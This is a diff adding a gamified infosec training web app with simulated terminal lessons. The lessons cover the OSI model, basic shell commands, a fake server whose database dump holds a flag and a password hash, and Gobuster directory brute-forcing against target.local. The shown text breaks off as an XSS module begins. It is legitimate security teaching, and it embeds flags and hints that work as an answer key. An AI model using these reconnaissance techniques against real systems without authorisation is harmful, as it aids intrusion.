@@ -1,0 +1,1638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberQuest - Interactive InfoSec Learning</title>
+
+    <script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600;700&family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        term: {
+                            black: '#0a0a0c',
+                            dark: '#111116',
+                            green: '#00ff41',
+                            darkgreen: '#008f11',
+                            cyan: '#00ffff',
+                            red: '#ff003c',
+                            gray: '#2a2a35',
+                            light: '#e0e0e0'
+                        }
+                    },
+                    fontFamily: {
+                        mono: ['"Fira Code"', 'monospace'],
+                        sans: ['Inter', 'sans-serif']
+                    },
+                    boxShadow: {
+                        'neon-green': '0 0 5px theme("colors.term.green"), 0 0 20px theme("colors.term.darkgreen")',
+                        'neon-cyan': '0 0 5px theme("colors.term.cyan"), 0 0 20px rgba(0, 255, 255, 0.4)',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            background-color: #0a0a0c;
+            color: #00ff41;
+            overflow-x: hidden;
+        }
+
+        /* CRT Scanline Effect */
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0,0,0,0.1) 50%,
+                rgba(0,0,0,0.1)
+            );
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 50;
+            opacity: 0.6;
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #111116; }
+        ::-webkit-scrollbar-thumb { background: #008f11; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff41; }
+
+        .glitch-hover:hover {
+            animation: glitch-skew 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) both infinite;
+            color: #00ffff;
+        }
+
+        @keyframes glitch-skew {
+            0% { transform: skew(0deg); }
+            20% { transform: skew(-10deg); }
+            40% { transform: skew(10deg); }
+            60% { transform: skew(-5deg); }
+            80% { transform: skew(5deg); }
+            100% { transform: skew(0deg); }
+        }
+
+        .terminal-input-cursor {
+            display: inline-block;
+            width: 10px;
+            height: 1.2em;
+            background-color: #00ff41;
+            vertical-align: middle;
+            animation: blink 1s step-end infinite;
+        }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+        .path-line {
+            position: absolute;
+            width: 4px;
+            background-color: #2a2a35;
+            z-index: -1;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+        .path-line.active { background-color: #00ff41; box-shadow: 0 0 10px #00ff41; }
+
+        .toast {
+            transition: all 0.3s ease-in-out;
+            transform: translateY(-100%);
+            opacity: 0;
+        }
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+    </style>
+</head>
+<body class="font-mono h-screen flex flex-col md:flex-row antialiased selection:bg-term-green selection:text-term-black">
+    <div class="scanlines"></div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast fixed top-4 right-4 z-50 bg-term-dark border border-term-green px-6 py-4 rounded shadow-neon-green flex items-center gap-3">
+        <i id="toast-icon" class="fas fa-info-circle text-xl"></i>
+        <span id="toast-msg" class="text-term-light font-sans font-medium">Notification</span>
+    </div>
+
+    <!-- Sidebar -->
+    <aside class="w-full md:w-72 bg-term-dark border-b md:border-b-0 md:border-r border-term-gray flex flex-col z-10 shrink-0 shadow-[4px_0_24px_rgba(0,255,65,0.05)]">
+        <div class="p-6 border-b border-term-gray text-center">
+            <h1 class="text-2xl font-bold text-term-green tracking-wider glitch-hover cursor-default">
+                <i class="fas fa-shield-halved mr-2"></i>CYBER_QUEST
+            </h1>
+            <p class="text-xs text-term-light mt-2 opacity-70 font-sans">v2.1.0 // MARKET EXPANDED</p>
+        </div>
+
+        <!-- User Stats -->
+        <div class="p-6 border-b border-term-gray space-y-4">
+            <div class="flex items-center gap-4">
+                <div class="w-16 h-16 rounded-full border-2 border-term-cyan flex items-center justify-center bg-term-black relative overflow-hidden">
+                    <i class="fas fa-user-ninja text-2xl text-term-cyan"></i>
+                    <div id="xp-fill" class="absolute bottom-0 left-0 w-full bg-term-cyan/30" style="height: 0%;"></div>
+                </div>
+                <div>
+                    <h2 id="player-title" class="text-term-light font-bold text-lg leading-tight">Script Kiddie</h2>
+                    <p class="text-sm text-term-green">Level <span id="player-level">1</span></p>
+                </div>
+            </div>
+
+            <div class="space-y-1">
+                <div class="flex justify-between text-xs font-sans text-term-light">
+                    <span>XP</span>
+                    <span id="xp-text">0 / 100</span>
+                </div>
+                <div class="h-2 w-full bg-term-black rounded-full overflow-hidden border border-term-gray">
+                    <div id="xp-bar" class="h-full bg-term-green transition-all duration-500" style="width: 0%;"></div>
+                </div>
+            </div>
+
+            <div class="flex justify-between items-center bg-term-black p-3 rounded border border-term-gray">
+                <span class="text-term-light text-sm"><i class="fas fa-coins text-yellow-500 mr-2"></i>Credits</span>
+                <span id="player-credits" class="font-bold text-yellow-500">0</span>
+            </div>
+        </div>
+
+        <!-- Navigation -->
+        <nav class="p-4 flex-1 space-y-2">
+            <button onclick="switchView('map')" class="nav-btn w-full text-left px-4 py-3 rounded text-term-light hover:bg-term-gray hover:text-term-green transition-colors flex items-center gap-3 active-nav bg-term-gray text-term-green" id="nav-map">
+                <i class="fas fa-network-wired w-5 text-center"></i> Mainframe Path
+            </button>
+            <button onclick="switchView('shop')" class="nav-btn w-full text-left px-4 py-3 rounded text-term-light hover:bg-term-gray hover:text-term-cyan transition-colors flex items-center gap-3" id="nav-shop">
+                <i class="fas fa-store w-5 text-center"></i> Dark Web Market
+            </button>
+            <button onclick="switchView('inventory')" class="nav-btn w-full text-left px-4 py-3 rounded text-term-light hover:bg-term-gray hover:text-term-green transition-colors flex items-center gap-3" id="nav-inventory">
+                <i class="fas fa-box w-5 text-center"></i> Inventory
+            </button>
+        </nav>
+
+        <!-- Active Buffs -->
+        <div id="active-buffs" class="p-4 border-t border-term-gray min-h-[100px]">
+            <p class="text-xs text-term-light opacity-50 mb-2">ACTIVE DAEMONS</p>
+            <div id="buff-container" class="flex flex-wrap gap-2">
+                <!-- Buffs spawn here -->
+            </div>
+        </div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="flex-1 relative overflow-hidden bg-term-black flex flex-col">
+
+        <!-- View: Map (Learning Path) -->
+        <div id="view-map" class="view-section absolute inset-0 overflow-y-auto p-8 pb-32">
+            <div class="max-w-3xl mx-auto text-center mb-10">
+                <h2 class="text-3xl font-bold text-term-light mb-4">Neural Pathway</h2>
+                <p class="text-term-light opacity-80 font-sans">Complete nodes to learn concepts, earn XP, and gather Credits. The deeper you go, the harder it gets.</p>
+
+                <div class="mt-6 flex flex-col sm:flex-row items-center gap-4 justify-center">
+                    <div class="relative w-full sm:w-80">
+                        <i class="fas fa-magnifying-glass absolute left-3 top-1/2 -translate-y-1/2 text-term-green opacity-50"></i>
+                        <input id="map-search" oninput="renderMap()" type="text" placeholder="Search 300+ modules..." class="w-full bg-term-dark border border-term-gray text-term-light p-3 pl-10 rounded focus:outline-none focus:border-term-green font-sans text-sm" autocomplete="off">
+                    </div>
+                    <span id="map-progress" class="text-xs font-sans text-term-cyan whitespace-nowrap tracking-widest"></span>
+                </div>
+            </div>
+
+            <div id="map-container" class="relative flex flex-col items-center gap-10 max-w-2xl mx-auto">
+                <!-- Nodes generated by JS -->
+            </div>
+        </div>
+
+        <!-- View: Lesson / Quiz -->
+        <div id="view-lesson" class="view-section absolute inset-0 overflow-y-auto hidden bg-term-dark z-20">
+            <div class="max-w-3xl mx-auto p-6 md:p-12 min-h-full flex flex-col">
+                <button onclick="switchView('map')" class="self-start text-term-light hover:text-term-green mb-8 transition-colors">
+                    <i class="fas fa-arrow-left mr-2"></i>Abort Mission
+                </button>
+
+                <div class="bg-term-black border border-term-gray rounded-lg p-8 shadow-2xl flex-1 flex flex-col">
+                    <div class="flex items-center gap-4 mb-6 pb-6 border-b border-term-gray">
+                        <div id="lesson-icon" class="w-12 h-12 rounded bg-term-gray flex items-center justify-center text-2xl text-term-cyan"></div>
+                        <div>
+                            <h2 id="lesson-title" class="text-2xl font-bold text-term-light">Title</h2>
+                            <p id="lesson-type" class="text-xs text-term-cyan uppercase tracking-widest mt-1">Concept</p>
+                        </div>
+                    </div>
+
+                    <div id="lesson-content" class="prose prose-invert prose-green max-w-none w-full font-sans text-term-light/90 space-y-4 mb-8 flex-1 block">
+                        <!-- Content -->
+                    </div>
+
+                    <div id="lesson-interactive" class="bg-term-dark p-6 rounded border border-term-gray mt-auto">
+                        <h3 class="text-term-green font-bold mb-4 font-mono">>> CHALLENGE</h3>
+                        <p id="lesson-question" class="mb-4 font-sans text-term-light"></p>
+
+                        <!-- Quiz Options -->
+                        <div id="quiz-options" class="grid grid-cols-1 md:grid-cols-2 gap-4 hidden">
+                        </div>
+
+                        <!-- Text Input -->
+                        <div id="text-input-area" class="hidden relative">
+                            <i class="fas fa-terminal absolute left-4 top-1/2 -translate-y-1/2 text-term-green opacity-50"></i>
+                            <input type="text" id="lesson-text-input" class="w-full bg-term-black border border-term-gray text-term-green p-4 pl-12 rounded focus:outline-none focus:border-term-green font-mono" placeholder="Enter solution..." autocomplete="off">
+                            <button id="submit-text-btn" class="absolute right-2 top-1/2 -translate-y-1/2 bg-term-green text-term-black px-4 py-2 rounded font-bold hover:bg-term-cyan transition-colors">SUBMIT</button>
+                        </div>
+
+                        <!-- Hint System -->
+                        <div class="mt-6 flex justify-between items-center border-t border-term-gray pt-4">
+                            <button id="btn-hint" class="text-sm text-yellow-500 hover:text-yellow-400 transition-colors flex items-center gap-2">
+                                <i class="fas fa-lightbulb"></i> <span id="hint-text">Request Hint (Cost: 10 Credits)</span>
+                            </button>
+                            <div id="hint-display" class="hidden text-sm font-sans text-term-light italic max-w-md text-right"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- View: Interactive Terminal -->
+        <div id="view-terminal" class="view-section absolute inset-0 hidden bg-term-black z-30 flex flex-col md:flex-row">
+
+            <!-- Terminal Main Area -->
+            <div class="flex-1 flex flex-col relative h-full border-r border-term-gray">
+                <!-- Terminal Header -->
+                <div class="bg-term-dark border-b border-term-gray p-4 flex justify-between items-center shrink-0">
+                    <div class="flex items-center gap-4">
+                        <button onclick="switchView('map')" class="text-term-light hover:text-term-red transition-colors" title="Abort Mission">
+                            <i class="fas fa-power-off"></i>
+                        </button>
+                        <div>
+                            <h2 id="terminal-title" class="font-bold text-term-cyan">target_server.sh</h2>
+                            <p id="terminal-status" class="text-xs text-term-green font-sans opacity-80">Connection Established</p>
+                        </div>
+                    </div>
+                    <div class="flex gap-2">
+                        <span class="w-3 h-3 rounded-full bg-term-green shadow-[0_0_8px_#00ff41]"></span>
+                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-term-red"></span>
+                    </div>
+                </div>
+
+                <!-- Terminal Output Area -->
+                <div id="terminal-output" class="flex-1 p-6 overflow-y-auto font-mono text-sm space-y-2 pb-24 text-term-light">
+                    <!-- Output dynamically generated -->
+                </div>
+
+                <!-- Terminal Input -->
+                <div class="bg-term-dark border-t border-term-gray p-4 shrink-0 flex items-center gap-3 absolute bottom-0 left-0 w-full">
+                    <span class="text-term-green font-bold">guest@target:~$</span>
+                    <input type="text" id="terminal-input" class="flex-1 bg-transparent border-none text-term-light focus:outline-none font-mono text-sm" autocomplete="off" spellcheck="false" autofocus>
+                    <span class="terminal-input-cursor hidden"></span>
+                </div>
+            </div>
+
+            <!-- Terminal Tactical HUD (Sidebar) -->
+            <div class="w-full md:w-80 bg-term-dark flex flex-col shrink-0 overflow-y-auto">
+                <div class="p-4 border-b border-term-gray bg-term-gray/20">
+                    <h3 class="text-term-cyan font-bold tracking-widest text-sm uppercase flex items-center"><i class="fas fa-crosshairs mr-2"></i>Mission Objectives</h3>
+                </div>
+                <div class="p-4 border-b border-term-gray">
+                    <ul id="terminal-objective-list" class="space-y-3 text-sm font-sans text-term-light/90">
+                        <!-- Objectives injected here -->
+                    </ul>
+                </div>
+
+                <div class="p-4 border-b border-term-gray bg-term-gray/20 mt-auto md:mt-0">
+                    <h3 class="text-yellow-500 font-bold tracking-widest text-sm uppercase flex items-center"><i class="fas fa-terminal mr-2"></i>Command Reference</h3>
+                </div>
+                <div class="p-4 flex-1">
+                    <div id="terminal-cheatsheet" class="space-y-4">
+                        <!-- Cheatsheet injected here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- View: Shop -->
+        <div id="view-shop" class="view-section absolute inset-0 overflow-y-auto hidden p-8 bg-term-black">
+             <div class="max-w-4xl mx-auto">
+                <div class="flex justify-between items-end mb-8 border-b border-term-gray pb-4">
+                    <div>
+                        <h2 class="text-3xl font-bold text-term-cyan mb-2"><i class="fas fa-store mr-3"></i>Dark Web Market</h2>
+                        <p class="text-term-light opacity-80 font-sans">Exchange credits for exploits, hardware upgrades, and access keys.</p>
+                    </div>
+                    <div class="text-right">
+                        <p class="text-xs text-term-light mb-1">CURRENT BALANCE</p>
+                        <p class="text-2xl font-bold text-yellow-500"><i class="fas fa-coins mr-2"></i><span id="shop-balance">0</span></p>
+                    </div>
+                </div>
+
+                <div id="shop-items" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
+                    <!-- Shop items generated by JS -->
+                </div>
+             </div>
+        </div>
+
+        <!-- View: Inventory -->
+        <div id="view-inventory" class="view-section absolute inset-0 overflow-y-auto hidden p-8 bg-term-black">
+             <div class="max-w-4xl mx-auto">
+                <div class="mb-8 border-b border-term-gray pb-4">
+                    <h2 class="text-3xl font-bold text-term-green mb-2"><i class="fas fa-box-open mr-3"></i>Your Arsenal</h2>
+                    <p class="text-term-light opacity-80 font-sans">Tools and upgrades you have acquired.</p>
+                </div>
+
+                <div id="inventory-items" class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <div class="text-term-light opacity-50 italic">Inventory is empty. Visit the market.</div>
+                </div>
+             </div>
+        </div>
+    </main>
+
+    <script>
+        let state = {
+            xp: 0,
+            level: 1,
+            credits: 0,
+            unlockedNodes: [1], // IDs of accessible nodes
+            completedNodes: [], // IDs of finished nodes
+            inventory: [], // Array of item IDs
+            activeBuffs: {
+                xpMultiplier: 1.0,
+                freeHints: 0,
+                bypassFirewall: false,
+                creditMultiplier: 1.0,  // NEW
+                hintDiscount: false,    // NEW
+                flatCreditBonus: 0      // NEW
+            }
+        };
+
+        const titles = [
+            "Script Kiddie", "Novice Hacker", "Cyber Sentry", "Net Runner", "Data Phantom", "Elite Operator", "System Overlord"
+        ];
+
+        // Expanded Dark Web Market Data
+        const shopData = [
+            { id: 'item_coffee', name: 'Hacker Fuel', type: 'consumable', cost: 20, icon: 'fa-mug-hot', color: 'text-orange-500', desc: 'Instantly grants 50 base XP.', effect: () => { addXP(50); } },
+            { id: 'item_cracker', name: 'Auto-Cracker V1', type: 'consumable', cost: 50, icon: 'fa-key', color: 'text-yellow-500', desc: 'Grants 3 free hints to use during lessons.', effect: () => { state.activeBuffs.freeHints += 3; renderBuffs(); } },
+            { id: 'item_stim', name: 'Neural Stimulant', type: 'consumable', cost: 100, icon: 'fa-bolt', color: 'text-blue-500', desc: 'Overclocks your brain. Grants 6 free hints.', effect: () => { state.activeBuffs.freeHints += 6; renderBuffs(); } },
+            { id: 'item_cpu', name: 'Overclocked CPU', type: 'passive', cost: 150, icon: 'fa-microchip', color: 'text-purple-500', desc: 'Permanently increases all XP gains by 25%.', effect: () => { state.activeBuffs.xpMultiplier += 0.25; renderBuffs(); } },
+            { id: 'item_miner', name: 'Crypto Miner Bot', type: 'passive', cost: 250, icon: 'fa-coins', color: 'text-yellow-400', desc: 'Passively increases all Credit rewards by 25%.', effect: () => { state.activeBuffs.creditMultiplier += 0.25; renderBuffs(); } },
+            { id: 'item_proxy', name: 'Elite Proxy Chain', type: 'passive', cost: 300, icon: 'fa-server', color: 'text-term-cyan', desc: 'Bypasses basic firewalls, unlocking hidden paths.', effect: () => { state.activeBuffs.bypassFirewall = true; checkHiddenNodes(); renderBuffs(); } },
+            { id: 'item_vip', name: 'VIP Darknet Token', type: 'passive', cost: 400, icon: 'fa-id-card', color: 'text-pink-500', desc: 'Reduces the credit cost of purchasing hints by 50%.', effect: () => { state.activeBuffs.hintDiscount = true; renderBuffs(); } },
+            { id: 'item_0day', name: '0-Day Exploit', type: 'consumable', cost: 500, icon: 'fa-bomb', color: 'text-term-red', desc: 'A highly classified payload. Instantly grants 300 base XP.', effect: () => { addXP(300); } },
+            { id: 'item_ghost', name: 'Ghost Protocol', type: 'passive', cost: 600, icon: 'fa-user-ninja', color: 'text-gray-400', desc: 'Masks your presence. Grants a flat +10 Credits for every module completed.', effect: () => { state.activeBuffs.flatCreditBonus = 10; renderBuffs(); } }
+        ];
+
+        const mapNodes = [
+            {
+                id: 1, title: "Module 1: The OSI Model & Networking", type: "quiz", icon: "fa-network-wired", unlocks: [2],
+                desc: "Start here. Learn the basics of how computers communicate over the internet.",
+                content: `<p class="text-lg text-term-green mb-4">Welcome to the Mainframe. Before you can break into systems, you need to understand how they talk to each other.</p>
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">Layer 7 to Layer 1</h4>
+                          <p>The entire internet is built on a conceptual framework called the <strong>OSI Model (Open Systems Interconnection)</strong>.</p>
+                          <p class="mt-2">Think of sending an email like sending a physical package. At <strong>Layer 7 (Application)</strong>, you write the letter. By the time it hits <strong>Layer 3 (Network)</strong>, the IP address is slapped on the box. When it hits <strong>Layer 1 (Physical)</strong>, it's just raw electricity traveling down a copper wire.</p>`,
+                question: "Which layer of the OSI model deals with routing and IP addresses?",
+                options: ["Layer 1 (Physical)", "Layer 3 (Network)", "Layer 7 (Application)"],
+                answer: 1,
+                hint: "Think about the layer that slaps the address on the 'box'.",
+                rewards: { xp: 50, credits: 50 }
+            },
+            {
+                id: 2, title: "Module 2: Basic Command Line", type: "terminal", icon: "fa-terminal", unlocks: [8],
+                desc: "Learn to navigate the system using basic Linux commands to prepare for web recon.",
+                terminalGoal: "Use basic commands to navigate.",
+                terminalSetup: "Connected to training server. User context: guest.",
+                objectives: [
+                    "Type <code class='text-term-green'>whoami</code> to see your username.",
+                    "Type <code class='text-term-green'>pwd</code> to see your current directory."
+                ],
+                cheatsheet: [
+                    { cmd: "whoami", desc: "Print effective userid" },
+                    { cmd: "pwd", desc: "Print working directory" }
+                ],
+                terminalLogic: function(cmd) {
+                    cmd = cmd.trim().toLowerCase();
+                    if(cmd === 'whoami') {
+                        this.who = true;
+                        if (this.pwd) {
+                            this.completed = true;
+                            return "guest<br><br><span class='text-yellow-500 font-bold mt-2 block'>FLAG{basic_navigation_complete}</span>";
+                        }
+                        return "guest";
+                    }
+                    if(cmd === 'pwd') {
+                        this.pwd = true;
+                        if (this.who) {
+                            this.completed = true;
+                            return "/home/guest<br><br><span class='text-yellow-500 font-bold mt-2 block'>FLAG{basic_navigation_complete}</span>";
+                        }
+                        return "/home/guest";
+                    }
+                    return `bash: ${cmd}: command not found. Check the Command Reference panel.`;
+                },
+                hint: "Just type whoami and hit enter, then type pwd and hit enter.",
+                rewards: { xp: 100, credits: 100 }
+            },
+            {
+                id: 7, title: "Operation: Dark Web Database", type: "terminal", icon: "fa-user-secret", unlocks: [8], requiresProxy: true,
+                desc: "A hidden capstone node. Apply everything you've learned. Combine reconnaissance, file navigation, and situational awareness.",
+                content: `<p class="text-term-red font-bold text-xl mb-4 border-b border-term-red pb-2 uppercase tracking-widest"><i class="fas fa-skull-crossbones mr-2"></i>WARNING: RESTRICTED ZONE ENTERED.</p>
+                          <p class="text-lg">You have utilized the Elite Proxy Chain to bypass the perimeter firewall and land on an undocumented, hidden server deep within the target's internal infrastructure.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">Advanced Tactics: Living off the Land</h4>
+                          <p>When dropping onto an unknown, hostile server, you don't have a GUI, you don't know the layout, and you don't know what defensive traps are set up. Standard operating procedure dictates a methodical approach:</p>
+
+                          <ol class="list-decimal pl-6 space-y-4 mt-4 bg-term-black p-4 rounded border border-term-gray text-sm">
+                              <li><span class="text-term-cyan font-bold">Orientation (ls, pwd):</span> You must first map the directory structure to see what files exist and determine your current user context.</li>
+                              <li><span class="text-term-cyan font-bold">Intelligence Gathering (cat):</span> Review any logs or text files for clues. System administrators often leave notes, passwords, or deployment scripts in plain text by accident.</li>
+                              <li><span class="text-term-cyan font-bold">Data Exfiltration:</span> Locate and extract high-value targets (like configuration files, password hashes, or SQL databases).</li>
+                          </ol>
+
+                          <p class="mt-8 font-bold text-yellow-500">The administrators thought obscuring this server was enough security. They rely on "Security through Obscurity," which is fundamentally flawed.</p>
+
+                          <div class="bg-term-gray/30 p-6 border-l-4 border-term-red mt-8 rounded shadow-lg shadow-term-red/20">
+                              <h5 class="text-term-red font-bold mb-2 text-lg"><i class="fas fa-crosshairs mr-2"></i>Final Mission Briefing</h5>
+                              <p class="text-sm leading-relaxed mb-4 font-sans text-term-light">Your objective is to locate a hidden database backup file and read its contents to extract the master flag. Do not type random commands; be methodical.</p>
+                              <p class="text-sm font-bold text-term-light mb-2">Your execution steps:</p>
+                              <ul class="list-disc pl-4 text-sm font-sans space-y-2 text-term-light/90">
+                                  <li>Step 1: Check your surroundings by listing the directory contents.</li>
+                                  <li>Step 2: (Optional but recommended) Read through the text files/logs to understand the server context.</li>
+                                  <li>Step 3: Use the concatenate tool to read the SQL database file to secure the master flag.</li>
+                              </ul>
+                          </div>`,
+                terminalGoal: "Locate and extract the flag from the hidden database file.",
+                terminalSetup: "Proxy chain established. Multi-hop routing active. Connected to root@hidden-svc.",
+                objectives: [
+                    "Type <code class='text-term-green'>ls</code> to view the hidden directory files.",
+                    "Locate the database backup file.",
+                    "Type <code class='text-term-green'>cat [filename]</code> on the database file to extract the flag."
+                ],
+                cheatsheet: [
+                    { cmd: "ls", desc: "List directory contents." },
+                    { cmd: "cat [file]", desc: "Output file contents to screen." }
+                ],
+                terminalLogic: function(cmd) {
+                    cmd = cmd.trim().toLowerCase();
+                    if(cmd === 'ls') {
+                        this.lsDone = true;
+                        return "<span class='text-term-green'>database_backup.sql</span>  <span class='text-term-light'>server_logs.txt</span>  <span class='text-term-light'>sysadmin_notes.txt</span>";
+                    }
+                    if(cmd === 'cat sysadmin_notes.txt') {
+                        if(!this.lsDone) return "Command failed. You must 'ls' first to discover files.";
+                        return "NOTE: The automated backup script is dumping the entire users table into database_backup.sql every night at 2AM. I need to move this off the webroot before the audit next week. - Dave";
+                    }
+                    if(cmd === 'cat server_logs.txt') {
+                        if(!this.lsDone) return "Command failed. You must 'ls' first to discover files.";
+                        return "[INFO] Login attempt: admin from 10.0.0.5... SUCCESS<br>[WARN] Unauthorized port scan detected from external IP.<br>[SYS] Nightly database backup written to database_backup.sql.";
+                    }
+                    if(cmd === 'cat database_backup.sql') {
+                        if(!this.lsDone) return "Command failed. You must 'ls' first to discover files.";
+                        this.completed = true;
+                        return "<span class='text-yellow-500'>Parsing SQL dump...</span><br><br>CREATE TABLE users (id INT, username VARCHAR, password VARCHAR);<br>INSERT INTO users VALUES (1, 'admin', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8');<br>INSERT INTO flags VALUES ('<span class='text-term-green font-bold text-lg'>FLAG{master_of_the_mainframe_level_cleared}</span>');<br><br><span class='text-term-red font-bold animate-pulse'>CRITICAL ALARM TRIPPED. Connection terminated by remote host.</span>";
+                    }
+                    if(cmd === 'pwd') return "/var/www/hidden_backups";
+                    if(cmd === 'help') return "Check the Tactical HUD on the right for allowed commands.";
+                    return `bash: ${cmd}: command not found. Check the Command Reference panel.`;
+                },
+                hint: "Start with 'ls'. You will see three files. Use 'cat database_backup.sql' to finish the mission.",
+                rewards: { xp: 300, credits: 200 }
+            },
+            {
+                id: 8, title: "Web Recon: Directory Brute-Forcing", type: "terminal", icon: "fa-folder-open", unlocks: [9],
+                desc: "Websites hide things. Admin panels, old backups, and sensitive documents are often sitting on a server, just unlinked. Let's find them.",
+                content: `<p class="text-lg text-term-green mb-4">You've mapped ports and broken basic logins, but what if the login page itself is hidden? Welcome to Web Reconnaissance.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">The Illusion of Unlinked Pages</h4>
+                          <p>Developers frequently assume that if they don't put a link to a page on their homepage, nobody will ever find it. They might create a staging environment at <code>www.target.com/dev-test-v2/</code> or leave an old database backup at <code>www.target.com/backup.zip</code>.</p>
+                          <p class="mt-2 font-bold text-yellow-500">In cybersecurity, we call this "Security through Obscurity," and it is a massive failure.</p>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">HTTP Status Codes</h4>
+                          <p>When you ask a web server for a page, it replies with a 3-digit code:</p>
+                          <ul class="list-none space-y-2 mt-4 bg-term-black p-4 rounded border border-term-gray font-mono text-sm">
+                              <li><span class="text-term-green">200 OK:</span> The file exists and the server sent it to you.</li>
+                              <li><span class="text-term-cyan">301/302 Redirect:</span> The file moved, and the server is sending you somewhere else.</li>
+                              <li><span class="text-term-red">403 Forbidden:</span> The file exists, but you don't have permission to see it (Still useful! It tells us the directory exists).</li>
+                              <li><span class="text-term-gray">404 Not Found:</span> The file does not exist.</li>
+                              <li><span class="text-yellow-500">500 Internal Server Error:</span> The server crashed trying to process your request.</li>
+                          </ul>
+
+                          <h4 class="text-term-cyan mt-8 mb-2 font-bold uppercase tracking-wide">Automated Enumeration (Gobuster)</h4>
+                          <p>Attackers do not manually type thousands of URLs into their browser hoping to get a '200 OK'. Instead, they use massive text files called <strong>Wordlists</strong> (like the famous <em>SecLists</em> or <em>rockyou.txt</em>) that contain millions of common directory names.</p>
+                          <p class="mt-2">They feed these wordlists into automated tools like <strong>Gobuster</strong>, <strong>Dirb</strong>, or <strong>ffuf</strong>. These tools fire thousands of requests a second at the server and filter out all the '404 Not Found' responses, leaving the hacker with a map of the hidden infrastructure.</p>
+
+                          <div class="bg-term-gray/30 p-6 border-l-4 border-term-cyan mt-8 rounded shadow-lg">
+                              <h5 class="text-term-cyan font-bold mb-2 text-lg"><i class="fas fa-terminal mr-2"></i>Mission Briefing</h5>
+                              <p class="text-sm leading-relaxed mb-4">We've identified a target web server running on port 80 at <strong>http://target.local</strong>. The homepage is useless corporate marketing fluff. We need to find the hidden administrator portal.</p>
+                              <p class="text-sm font-bold text-term-light mb-2">Your execution steps:</p>
+                              <ol class="list-decimal pl-4 text-sm font-sans space-y-2 text-term-light/90">
+                                  <li>Enter the terminal environment.</li>
+                                  <li>Use the <code class="text-term-green">gobuster</code> command line tool.</li>
+                                  <li>Pass the URL parameter <code class="text-term-cyan">-u http://target.local</code> and the wordlist parameter <code class="text-term-cyan">-w common.txt</code> to scan the site.</li>
+                                  <li>Identify the hidden directory in the output to retrieve your flag.</li>
+                              </ol>
+                          </div>`,
+                terminalGoal: "Run Gobuster to find the hidden directory.",
+                terminalSetup: "Gobuster v3.1.0 initialized. Wordlist 'common.txt' loaded (4,614 words).",
+                objectives: [
+                    "Execute <code class='text-term-green'>gobuster dir -u http://target.local -w common.txt</code>",
+                    "Analyze the HTTP response codes to find the hidden path."
+                ],
+                cheatsheet: [
+                    { cmd: "gobuster dir -u [URL] -w [list]", desc: "Brute-force directories on a web server." },
+                    { cmd: "clear", desc: "Clear terminal output." }
+                ],
+                terminalLogic: function(cmd) {
+                    cmd = cmd.trim().toLowerCase();
+                    if(cmd === 'gobuster dir -u http://target.local -w common.txt' || cmd === 'gobuster -u http://target.local -w common.txt dir' || cmd === 'gobuster dir -w common.txt -u http://target.local') {
+                        this.completed = true;
+                        return `===============================================================<br>
+                                Gobuster v3.1.0<br>
+                                by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)<br>
+                                ===============================================================<br>
+                                [+] Url:                     http://target.local<br>
+                                [+] Threads:                 10<br>
+                                [+] Wordlist:                common.txt<br>
+                                [+] Status codes:            200,204,301,302,307,401,403<br>
+                                ===============================================================<br>
+                                2026/09/15 14:32:11 Starting gobuster in directory enumeration mode<br>
+                                ===============================================================<br>
+                                /assets               (Status: 301) [Size: 315] [--> /assets/]<br>
+                                /css                  (Status: 301) [Size: 312] [--> /css/]<br>
+                                /index.html           (Status: 200) [Size: 1042]<br>
+                                <span class='text-term-red'>/super_secret_admin_v3 (Status: 200) [Size: 4096]</span><br>
+                                /robots.txt           (Status: 200) [Size: 67]<br>
+                                ===============================================================<br>
+                                2026/09/15 14:32:14 Finished<br>
+                                ===============================================================<br>
+                                <span class='text-yellow-500 font-bold mt-2 block'>FLAG{directory_enumeration_exposes_secrets}</span>`;
+                    }
+                    if(cmd.startsWith('gobuster')) return "Error: Missing required flags. Check your syntax. You need 'dir', '-u http://target.local', and '-w common.txt'.";
+                    return `bash: ${cmd}: command not found. Check the Command Reference panel.`;
+                },
+                hint: "Type the command exactly as shown in the objectives: gobuster dir -u http://target.local -w common.txt",
+                rewards: { xp: 150, credits: 60 }
+            },
+            {
+                id: 9, title: "Web Exploitation: XSS (Cross-Site Scripting)", type: "input", icon: "fa-code", unlocks: [10],
